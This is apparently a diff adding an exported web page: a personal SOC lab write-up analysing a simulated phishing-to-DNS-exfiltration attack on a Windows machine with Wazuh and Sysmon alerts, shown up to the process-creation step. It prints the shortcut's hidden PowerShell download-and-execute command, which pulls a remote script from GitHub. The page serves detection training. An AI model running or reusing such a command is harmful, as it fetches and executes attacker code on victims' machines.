@@ -1,0 +1,452 @@
+<!DOCTYPE html> <html lang="en"><head>
+<link rel="icon" href="../x_assets/9fc7800b3dae2588c0d14d39e880af89/favicon.ico" type="image/x-icon">
+<title>Incident Analysis - Multi-Stage DNS Exfiltration</title>
+<base href="..">
+<meta name="pathname" content="projects/incident-analysis-multi-stage-dns-exfiltration.html">
+<meta name="description" content="Explorer - Incident Analysis - Multi-Stage DNS Exfiltration">
+<meta property="og:title" content="Incident Analysis - Multi-Stage DNS Exfiltration">
+<meta property="og:description" content="Explorer - Incident Analysis - Multi-Stage DNS Exfiltration">
+<meta property="og:type" content="website">
+<meta property="og:url" content="projects/incident-analysis-multi-stage-dns-exfiltration.html">
+<meta property="og:image" content="_files/pasted-image-20260915113944.png">
+<meta charset="UTF-8"><meta property="og:site_name" content="Explorer"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0"><script async="" id="webpage-script" src="site-lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-wasm-script" src="site-lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="site-lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="preload" href="site-lib/styles/snippets.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/snippets.css"></noscript><link rel="stylesheet" href="site-lib/styles/obsidian.css"><link rel="stylesheet" href="site-lib/styles/theme.css"><link rel="preload" href="site-lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="site-lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/main-styles.css"></noscript><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-vertical-spacing:1.3em;--sidebar-margin:12px}:root{background-color:#202124}.sidebar{height:100%;font-size:14px;z-index:10;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));position:relative;overflow:hidden;overflow:clip;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}#left-sidebar{left:0}#right-sidebar{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}.sidebar.floating{position:absolute}.sidebar .leaf-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .leaf-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}#left-sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}#right-sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar #left-sidebar-content,.sidebar #right-sidebar-content{contain:none!important;container-type:normal!important;animation:none!important}.sidebar:has(.leaf-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:calc(2.3em + 2 * var(--sidebar-margin));width:var(--sidebar-width);padding:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}#left-sidebar .sidebar-topbar{left:0;flex-direction:row;border-top-right-radius:var(--radius-l)}#right-sidebar .sidebar-topbar{right:0;flex-direction:row-reverse;border-top-left-radius:var(--radius-l)}#left-sidebar .topbar-content{margin-right:calc(2.3em + var(--sidebar-margin));flex-direction:row}#right-sidebar .topbar-content{margin-left:calc(2.3em + var(--sidebar-margin));flex-direction:row-reverse}.topbar-content{overflow:hidden visible;overflow:clip visible;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:2px!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}#left-sidebar .clickable-icon.sidebar-collapse-icon{right:var(--sidebar-margin)}#right-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.feature-title{margin-left:1px;text-transform:uppercase;letter-spacing:.06em;margin-top:.75em;margin-bottom:.75em}.feature-header{display:flex;align-items:center;padding-top:0;font-size:1em;padding-left:0}body.floating-sidebars .sidebar{position:absolute}body{transition:background-color var(--color-fade-speed) ease-in-out}#navbar:not(:empty){display:flex;align-items:center;justify-content:space-between;padding:.5em 1em;width:100%}#main{display:flex;flex-direction:column;height:100%;width:100%;align-items:stretch;justify-content:center}#main-horizontal{display:flex;flex-direction:row;flex-grow:1;width:100%;align-items:stretch;justify-content:center}#center-content{flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0!important;transition:opacity .2s ease-in-out;pointer-events:none}#center-content>.obsidian-document{padding-left:2em;padding-right:1em;margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}body #center-content>.obsidian-document>.markdown-preview-sizer{padding-bottom:80vh;width:100%;max-width:var(--line-width);flex-basis:var(--line-width);transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document>div{width:100%!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document:not([data-type=markdown]).embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}#center-content>.obsidian-document:not([data-type=markdown]).embed>*{max-width:100%;max-height:100%;object-fit:contain}:not(h1,h2,h3,h4,h5,h6,li):has(> :is(.math,table)){overflow-x:auto!important}#center-content>.obsidian-document:not([data-type=markdown]){overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.obsidian-document[data-type=attachment]{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;width:100%}.obsidian-document[data-type=attachment]>*{outline:0;border:none;box-shadow:none}.obsidian-document[data-type=attachment] :is(img){max-width:90%;max-height:90%;object-fit:contain}.obsidian-document[data-type=attachment]>:is(audio){width:100%;max-width:min(90%,var(--line-width))}.obsidian-document[data-type=attachment]>:is(embed,iframe,video){width:100%;height:100%;max-width:100%;max-height:100%;object-fit:contain}.canvas-wrapper>:is(.header,.footer){z-index:100;position:absolute;display:flex;justify-content:center;flex-direction:column;width:100%;align-items:center}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){let e=document.querySelectorAll("link[itemprop='include']");for(const t of e){let e=t.getAttribute("href");try{let o="";if(e.startsWith("https:")||e.startsWith("http:")||"file:"!=window.location.protocol){const n=await fetch(e);if(!n.ok){console.log("Could not include file: "+e),t?.remove();continue}o=await n.text()}else{const t=document.getElementById(btoa(encodeURI(e)));if(t){const e=JSON.parse(decodeURI(atob(t.getAttribute("value")??"")));o=e?.data??""}}let n=document.createRange().createContextualFragment(o);t.before(n),t.remove(),console.log("Included text: "+o),console.log("Included file: "+e)}catch(o){t?.remove(),console.log("Could not include file: "+e,o);continue}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script")));!function e(n){let l=o[n],c=n+1;l?(l&&"true"!=l.getAttribute("loaded")||n<o.length&&e(c),n<o.length&&l.addEventListener("load",(()=>e(c)))):n<o.length?e(c):t()}(0)}</script><style>
+/* Hide _files directories in file explorer */
+/* Hide parent when child has _files in data-path */
+.tree-item > .tree-item-self[data-path*="_files"],
+.tree-item[data-path*="_files"] {
+  display: none !important;
+}
+/* Hide sibling children of the folder */
+.tree-item-self[data-path*="_files"] ~ .tree-item-children {
+  display: none !important;
+}
+/* Hide the entire tree-item folder wrapper */
+.nav-folder:has(> .tree-item-self[data-path*="_files"]) {
+  display: none !important;
+}
+</style>
+</head><body class="publish css-settings-manager styled-scrollbars show-inline-title show-ribbon is-focused"><script defer="">document.body.classList.add("theme-dark");document.body.classList.remove("theme-light");window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="parsed-feature-container" style="display: contents;"><link itemprop="include" href="site-lib/html/custom-head-content-content.html"></div><div id="main"><div id="navbar"></div><div id="main-horizontal"><div id="left-content" class="leaf" style="--sidebar-width: var(--sidebar-width-left);"><div id="left-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><div id="search-container"><div id="search-wrapper"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div aria-label="Clear search" id="search-clear-button"></div></div></div></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="left-sidebar-content" class="leaf-content"><link itemprop="include" href="site-lib/html/file-tree-content.html"></div></div><script defer="">let ls = document.querySelector("#left-sidebar"); ls.classList.toggle("is-collapsed", window.innerWidth < 768); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div></div><div id="center-content" class="leaf"><div class="obsidian-document markdown-preview-view markdown-rendered node-insert-event is-readable-line-width allow-fold-headings allow-fold-lists show-indentation-guide show-properties" data-type="markdown"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><div class="header"><h1 class="page-title heading inline-title" id="Incident_Analysis_-_Multi-Stage_DNS_Exfiltration_0">Incident Analysis - Multi-Stage DNS Exfiltration</h1><div class="data-bar"></div></div><div class="markdown-preview-pusher" style="width: 1px; height: 0.1px; margin-bottom: 0px;"></div><div class="el-p"><p dir="auto">Date: Sep 12, 2026<br>
+Tags: <a data-href="SOC" href="tags/soc.html" class="internal-link" target="_self" rel="noopener nofollow">SOC</a> <a data-href="DFIR" href="tags/dfir.html" class="internal-link" target="_self" rel="noopener nofollow">DFIR</a> <a data-href="Endpoint Security" href="tags/endpoint-security.html" class="internal-link" target="_self" rel="noopener nofollow">Endpoint Security</a> <a data-href="Threat Hunting" href="tags/threat-hunting.html" class="internal-link" target="_self" rel="noopener nofollow">Threat Hunting</a> <a data-href="Log Correlation" href="tags/log-correlation.html" class="internal-link" target="_self" rel="noopener nofollow">Log Correlation</a> <a data-href="Process Causality" href="tags/process-causality.html" class="internal-link" target="_self" rel="noopener nofollow">Process Causality</a> <a data-href="MITRE ATTACK" href="tags/mitre-attack.html" class="internal-link" target="_self" rel="noopener nofollow">MITRE ATTACK</a> <a data-href="SIEM" href="tags/siem.html" class="internal-link" target="_self" rel="noopener nofollow">SIEM</a> <a data-href="Wazuh" href="tags/wazuh.html" class="internal-link" target="_self" rel="noopener nofollow">Wazuh</a> <a data-href="Sysmon" href="tags/sysmon.html" class="internal-link" target="_self" rel="noopener nofollow">Sysmon</a> <a data-href="Powershell" href="tags/powershell.html" class="internal-link" target="_self" rel="noopener nofollow">Powershell</a> <a data-href="Windows" href="tags/windows.html" class="internal-link" target="_self" rel="noopener nofollow">Windows</a> <a data-href="DNS" href="tags/dns.html" class="internal-link" target="_self" rel="noopener nofollow">DNS</a><br>
+<span alt="Pasted image 20260915113944.png" src="_files/pasted-image-20260915113944.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260915113944.png" src="_files/pasted-image-20260915113944.png" target="_self"></span></p></div><div class="el-h5"><h5 data-heading="I. Executive Summary" dir="auto" class="heading" id="I._Executive_Summary_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>I. Executive Summary</h5></div><div class="el-p"><p dir="auto">In previous lab entries, I utilized Wazuh to aggregate network, endpoint, and application telemetry. To test these detection capabilities, I investigated a simulated, multi-stage DNS exfiltration incident on a Windows endpoint.</p></div><div class="el-p"><p dir="auto">I correlated the events on Wazuh to track the adversary's abuse of Windows binaries. The alerts also guided me in collecting forensic evidence and breaking down the complete attack chain from the initial phishing lure to data exfiltration and persistence.</p></div><div class="el-h5"><h5 data-heading="II Attack Chain Overview (MITRE ATT&amp;CK)" dir="auto" class="heading" id="II_Attack_Chain_Overview_(MITRE_ATT&amp;CK)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>II Attack Chain Overview (MITRE ATT&amp;CK)</h5></div><div class="el-table" dir="ltr" style="overflow-x: auto;"><table>
+<thead>
+<tr>
+<th dir="ltr">Tactics</th>
+<th dir="ltr">Technique</th>
+<th dir="ltr">Implementation Summary</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td dir="ltr"><strong>Initial Access</strong></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/T1566" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/T1566" target="_self">Phishing (T1566)</a></td>
+<td dir="ltr">Utilized phishing campaign to lure the target into downloading and opening the <code>Q3_Bonus_Payout.pdf.lnk</code></td>
+</tr>
+<tr>
+<td dir="ltr"><strong>Execution</strong></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/T1059/001" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/T1059/001" target="_self">PowerShell (T1059.001)</a></td>
+<td dir="ltr">Utilized PowerShell to execute the attack chain.</td>
+</tr>
+<tr>
+<td dir="ltr"><strong>Stealth</strong></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/T1036/007" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/T1036/007" target="_self">Double File Extension (T1036.007)</a></td>
+<td dir="ltr">Masqueraded the <code>.lnk</code> payload by using double file extension <code>.pdf.lnk</code>.</td>
+</tr>
+<tr>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/T1027/010" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/T1027/010" target="_self">Command Obfuscation (T1027.010)</a></td>
+<td dir="ltr">Obfuscated some commands with <code>Base64</code> then decoded it during execution.</td>
+</tr>
+<tr>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/T1070/004" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/T1070/004" target="_self">File Deletion (T1070.004)</a></td>
+<td dir="ltr">Removed the main exfiltration payload after it was executed.</td>
+</tr>
+<tr>
+<td dir="ltr"><strong>Discovery</strong></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/T1033" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/T1033" target="_self">System Owner/User Discovery (T1033)</a></td>
+<td dir="ltr">Used <code>whoami</code> to identify the currently logged in user.</td>
+</tr>
+<tr>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/T1016" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/T1016" target="_self">System Network Configuration Discovery (T1016)</a></td>
+<td dir="ltr">Used <code>ipconfig /all</code> to look for network configuration such as IP and MAC address.</td>
+</tr>
+<tr>
+<td dir="ltr"><strong>Collection</strong></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/T1119" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/T1119" target="_self">Automated Collection (T1119)</a></td>
+<td dir="ltr">Used <code>Get-ChildItem -Recurse</code> to get the list of <code>.csv</code> files on the specified folder.</td>
+</tr>
+<tr>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/T1560/001" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/T1560/001" target="_self">Archive via Utility (T1560.001)</a></td>
+<td dir="ltr">Compressed all <code>.csv</code> files into a single <code>.zip</code> file before exfiltration.</td>
+</tr>
+<tr>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/T1074/001" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/T1074/001" target="_self">Local Data Staging (T1074.001)</a></td>
+<td dir="ltr">Staged the archived data on the user's <code>Temp</code> folder.</td>
+</tr>
+<tr>
+<td dir="ltr"><strong>Exfiltration</strong></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/T1020" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/T1020" target="_self">Automated Exfiltration (T1020)</a></td>
+<td dir="ltr">Looped <code>Resolve-DnsName</code> to perform exfiltration</td>
+</tr>
+<tr>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/T1030" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/T1030" target="_self">Data Transfer Size Limits (T1030)</a></td>
+<td dir="ltr">Set the <code>Base64</code> data payload to 45-character chunks.</td>
+</tr>
+<tr>
+<td dir="auto"></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/T1048" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/T1048" target="_self">Exfiltration Over Alternative Protocol (T1048)</a></td>
+<td dir="ltr">Exfiltrated the data using DNS protocol by performing <code>NULL</code> resource record type queries</td>
+</tr>
+<tr>
+<td dir="ltr"><strong>Persistence</strong></td>
+<td dir="ltr"><a data-tooltip-position="top" aria-label="https://attack.mitre.org/techniques/T1547" rel="noopener nofollow" class="external-link is-unresolved" href="https://attack.mitre.org/techniques/T1547" target="_self">Boot or Logon Autostart Execution (T1547)</a></td>
+<td dir="ltr">Modified the registry <code>HKCU\...\Run</code> to run a command on user login.</td>
+</tr>
+</tbody>
+</table></div><div class="el-h5"><h5 data-heading="III. Incident Analysis and Alert Correlation" dir="auto" class="heading" id="III._Incident_Analysis_and_Alert_Correlation_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>III. Incident Analysis and Alert Correlation</h5></div><div class="el-h6"><h6 data-heading="3.1 Initial Access" dir="auto" class="heading" id="3.1_Initial_Access_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>3.1 Initial Access</h6></div><div class="el-p"><p dir="auto">The attacker used a GitHub <a data-tooltip-position="top" aria-label="https://github.com/Jamilosa/Cybersecurity-Lab-Configurations/tree/main/scripts" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/Jamilosa/Cybersecurity-Lab-Configurations/tree/main/scripts" target="_self">Repository</a> to host their malicious staging and exfiltration scripts. The attack chain started when the victim opened a disguised shortcut file (<code>Q3_Bonus_Payout.pdf.lnk</code>), likely delivered via phishing.</p></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="-" data-callout="cmd" class="callout is-collapsible is-collapsed"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-terminal"><path d="M12 19h8"></path><path d="m4 17 6-6-6-6"></path></svg></div><div class="callout-title-inner">LNK Shortcut File Creation (Event ID 11) </div><div class="callout-fold is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content" style="display: none;">
+<p dir="auto">There were two level 6 alerts pointing out that there were scripting files created on a user folder. The fact that it's in the Downloads folder and uses <code>.pdf.lnk</code> extension suggest that the user might have fallen victim to a phishing scheme. The image <code>explorer.exe</code> as well as parent folder name also suggests that the user initially downloaded and extracted a compressed archive.</p>
+<p dir="auto">The second alert shows <code>explorer.exe</code> appending Mark of the Web (MotW) on the file to indicate its downloaded from the internet.</p>
+<p dir="auto"><span alt="Pasted image 20260913204806.png" src="_files/pasted-image-20260913204806.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260913204806.png" src="_files/pasted-image-20260913204806.png" target="_self"></span></p>
+<pre><code data-line="6">data.win.system.message: "File created:
+ProcessId: 12540
+Image: C:\WINDOWS\Explorer.EXE
+TargetFilename: C:\Users\jamilosa\Downloads\Q3_Bonus_Payout\Q3_Bonus_Payout.pdf.lnk
+rule.description: Scripting file created under Windows Temp or User folder
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><span alt="Pasted image 20260913205133.png" src="_files/pasted-image-20260913205133.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20260913205133.png" src="_files/pasted-image-20260913205133.png" target="_self"></span></p>
+<pre><code data-line="16">data.win.system.message: "File created:
+ProcessId: 12540
+Image: C:\WINDOWS\Explorer.EXE
+TargetFilename: C:\Users\jamilosa\Downloads\Q3_Bonus_Payout\Q3_Bonus_Payout.pdf.lnk:Zone.Identifier"
+rule.description: Scripting file created under Windows Temp or User folder
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto">Checking the <code>.lnk</code> file on the endpoint revealed an Alternate Data Stream (ADS) <code>Zone.Identifier</code>. The <code>ZoneId</code> and <code>ReferrerUrl</code> confirmed the file was downloaded from the internet and was originally a <code>.zip</code> archive (see <em>Artifact 1</em>). </p>
+<p dir="auto">Looking at the shortcut's <code>Target</code> property, it contained a command to start a hidden PowerShell process that downloads and executes the next script (see <em>Figure 1</em> and <em>Artifact 2</em>).</p>
+<pre class="language-shell"><code data-line="28" class="language-shell is-loaded"><span class="token comment"># cat -Path .\Q3_Bonus_Payout\Q3_Bonus_Payout.pdf.lnk:Zone.Identifier</span>
+<span class="token punctuation">[</span>ZoneTransfer<span class="token punctuation">]</span>
+<span class="token assign-left variable">ZoneId</span><span class="token operator">=</span><span class="token number">3</span>
+<span class="token assign-left variable">ReferrerUrl</span><span class="token operator">=</span>C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>jamilosa<span class="token punctuation">\</span>Downloads<span class="token punctuation">\</span>Q3_Bonus_Payout.zip
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><em>Artifact 1: Zone.Identifier Alternate Data Stream</em></p>
+<p dir="auto"><span alt="Pasted image 20260913092620.png" src="_files/pasted-image-20260913092620.png" class="internal-embed media-embed image-embed is-loaded" target="_self" style="width: 300px; max-width: 100%;"><img alt="Pasted image 20260913092620.png" src="_files/pasted-image-20260913092620.png" target="_self" style="width: 300px; max-width: 100%;"></span><br>
+<em>Figure 1: Shortcut's Target Property</em></p>
+<pre class="language-shell"><code data-line="39" class="language-shell is-loaded">C:<span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>WindowsPowerShell<span class="token punctuation">\</span>v1.0<span class="token punctuation">\</span>powershell.exe <span class="token parameter variable">-WindowStyle</span> Hidden <span class="token parameter variable">-ExecutionPolicy</span> Bypass <span class="token parameter variable">-Command</span> <span class="token string">"IEX (New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/Jamilosa/Cybersecurity-Lab-Configurations/main/scripts/stage1_exfil.ps1](https://raw.githubusercontent.com/Jamilosa/Cybersecurity-Lab-Configurations/main/scripts/stage1_exfil.ps1)')"</span>
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre>
+<p dir="auto"><em>Artifact 2: Shortcut's Target property contents</em></p>
+</div></div></div><div class="el-div"><div data-callout-metadata="" data-callout-fold="-" data-callout="cmd" class="callout is-collapsible is-collapsed"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-terminal"><path d="M12 19h8"></path><path d="m4 17 6-6-6-6"></path></svg></div><div class="callout-title-inner">Parent Process Creation (Event ID 1)</div><div class="callout-fold is-collapsed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-chevron-down"><path d="m6 9 6 6 6-6"></path></svg></div></div><div class="callout-content" style="display: none;">
+<p dir="auto">During the investigation, I queried the Manager's <code>archive.log</code> to look for process creation event that started the entire attack. The Sysmon log below shows <code>explorer.exe</code> was the Parent Image, which suggests that the user likely opened the file in File Explorer. The attacker used <code>-WindowStyle Hidden</code> so the terminal wouldn't flash on the screen while <code>stage1_exfil.ps1</code> is running. </p>
+<pre class="language-text"><code data-line="3" class="language-text is-loaded">ProcessId: 16900
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine: "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/Jamilosa/Cybersecurity-Lab-Configurations/main/scripts/stage1_exfil.ps1](https://raw.githubusercontent.com/Jamilosa/Cybersecurity-Lab-Configurations/main/scripts/stage1_exfil.ps1)')"
+CurrentDirectory: C:\Users\jamilosa\Downloads\Q3_Bonus_Payout\
+User: DESKTOP-1PIGLHC\jamilosa
+ParentProcessId: 12540
+ParentImage: C:\Windows\explorer.exe
